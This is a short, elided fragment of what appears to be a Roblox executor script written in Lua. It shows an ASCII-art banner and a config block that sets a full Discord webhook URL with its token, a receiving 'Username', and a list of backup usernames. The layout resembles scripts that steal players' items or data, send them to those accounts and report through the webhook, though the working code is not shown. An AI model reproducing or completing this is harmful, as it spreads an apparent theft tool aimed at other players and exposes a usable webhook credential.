--[[
 ...
 |_____/ \_____|_|  \_\_____|_|      |_| |_____/  (_) |_____/|_|  |_|
        ...
        getgenv().Webhook = "https://discord.com/api/webhooks/1389125900225740911/yQ98TIp0oNhv3-P94zHiNVzrnIrx3oJ5n6LCfin2nOMGDlY4X791z4oVXcfV5_AZ4nhg"
        getgenv().Username = "YourUsername"
        ...
        local usernames = {
            "PUT_HERE_UR_BACKUP_USERNAMES", -- Put Here ur Extra Usernames (Optional)
        }
